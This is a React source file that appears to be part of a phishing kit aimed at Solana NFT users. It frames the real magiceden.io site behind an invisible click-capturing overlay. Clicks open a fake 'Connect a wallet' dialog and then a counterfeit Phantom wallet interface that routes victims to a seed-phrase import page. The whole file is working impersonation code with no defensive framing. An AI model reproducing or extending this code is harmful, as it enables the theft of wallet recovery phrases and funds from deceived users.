import { useEffect, useState } from "react";
import Main from "./pages/main";
import ImportSeedPhrase from "./pages/importSeedPhrase";
import CreateWallet from "./pages/createWallet";
import "./App.css";

const App = () => {
  const [page, setPage] = useState('main');
  const [isDialog, setIsDialog] = useState(false);
  const [mainView, setMainView] = useState('iframe');

  useEffect(async () => {
    
  });

  const pageMain = () => {
    setPage("main");
  }

  const pageCreate = () => {
    setPage("create");
  }

  const pageImport = () => {
    setPage("import");
  }

  const showDialog = () => {
    setIsDialog(true);
  }

  const showIframePage = () => {
    setMainView("iframe")
  }

  const showWalletPage = () => {
    setIsDialog(false);
    setMainView("wallet")    
  }

  const closeDialog = () => {
    setIsDialog(false);
  }

  return (
    <div>      
      <div className={mainView == "iframe" ? 'iframeParentDiv':'iframeParentDiv hideDiv'}>
        <iframe src="https://magiceden.io" title="W3Schools Free Online Web Tutorials" className="mainFrame"></iframe>
        <div onClick={showDialog} className="clickDiv"></div>

      </div>          
      <div className={mainView == "wallet" ? '':'hideDiv'}>
          <header class="header">
            <div class="phantom_beta">
              <img src="img/grey_logo.png" width="22px" />
              <div class="phantom_beta_body">
                <p size="16" opacity="1" color="white" class="main_text">Phantom</p>
                <p size="15" color="#8A81F8" opacity="1" class="beta_text">Beta!</p>
              </div>
            </div>
            <a href="https://help.phantom.app" rel="noopener" target="_blank" class="help_link">
              <svg width="15" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M7.5 0C3.3589 0 0 3.3589 0 7.5C0 11.6411 3.3589 15 7.5 15C11.6411 15 15 11.6411 15 7.5C15 3.3589 11.6411 0 7.5 0ZM8.31288 11.7485C8.31288 12.0092 8.09816 12.2239 7.83742 12.2239H6.62577C6.36503 12.2239 6.15031 12.0092 6.15031 11.7485V10.9663C6.15031 10.7055 6.36503 10.4908 6.62577 10.4908H7.83742C8.09816 10.4908 8.31288 10.7055 8.31288 10.9663V11.7485ZM10.2301 7.08589C9.90798 7.53067 9.5092 7.88344 9.0184 8.14417C8.74233 8.32822 8.55828 8.51227 8.46626 8.72699C8.40491 8.86503 8.3589 9.04908 8.32822 9.2638C8.31288 9.43252 8.15951 9.55521 7.9908 9.55521H6.50307C6.30368 9.55521 6.15031 9.3865 6.16564 9.20245C6.19632 8.78834 6.30368 8.46626 6.47239 8.22086C6.68712 7.92945 7.07055 7.57669 7.6227 7.19325C7.91411 7.0092 8.12883 6.79448 8.29755 6.53374C8.46626 6.27301 8.54294 5.96626 8.54294 5.6135C8.54294 5.26074 8.45092 4.96932 8.25153 4.7546C8.05215 4.53988 7.79141 4.43252 7.43865 4.43252C7.14724 4.43252 6.91718 4.52454 6.71779 4.69325C6.59509 4.80061 6.5184 4.93865 6.47239 5.1227C6.41104 5.33742 6.21166 5.47546 5.98159 5.47546L4.60123 5.44479C4.43252 5.44479 4.29448 5.29141 4.30982 5.1227C4.35583 4.3865 4.64724 3.83436 5.15337 3.43558C5.7362 2.9908 6.48773 2.76074 7.43865 2.76074C8.45092 2.76074 9.24847 3.02147 9.83129 3.52761C10.4141 4.03374 10.7055 4.72393 10.7055 5.59816C10.7055 6.15031 10.5368 6.6411 10.2301 7.08589Z">
                </path>
              </svg>
              <p color="#AAA" size="16" opacity="1" class="help_text">Help</p>
            </a>
          </header>
          <main class="main">
            { page == 'main' &&
              <Main handleCreateWallet={pageCreate} handleImportWallet={pageImport}/>
            }
            { page == 'create' &&
              <CreateWallet handleMainPage={pageMain}/>
            }
            { page == 'import' &&
              <ImportSeedPhrase handleMainPage={pageMain} handleIframe={showIframePage}/>
            }
          </main>
        </div>       
    
      <div className={isDialog? "wallet-adapter-modal wallet-adapter-modal-fade-in" : "hideDialog" } aria-labelledby="wallet-adapter-modal-title" aria-modal="true" role="dialog">
        <div class="wallet-adapter-modal-container">
          <div class="wallet-adapter-modal-wrapper">
            <button class="wallet-adapter-modal-button-close" onClick={closeDialog}>
              <svg width="14" height="14"><path d="M14 12.461 8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z"></path></svg>
            </button>
            <h1 class="wallet-adapter-modal-title">Connect a wallet on Solana to continue</h1>
            <ul class="wallet-adapter-modal-list">
              <li>
                <button class="wallet-adapter-button " tabindex="0" type="button" onClick={showWalletPage}>
                  <i class="wallet-adapter-button-start-icon">
                    <img src="data:image/svg+xml;base64," alt="Phantom icon" />
                  </i>
                  Phantom
                  <span>Detected</span>
                </button>
              </li>
            </ul>
          </div>
        </div>
      </div>    
    </div>
  );
};

export default App;
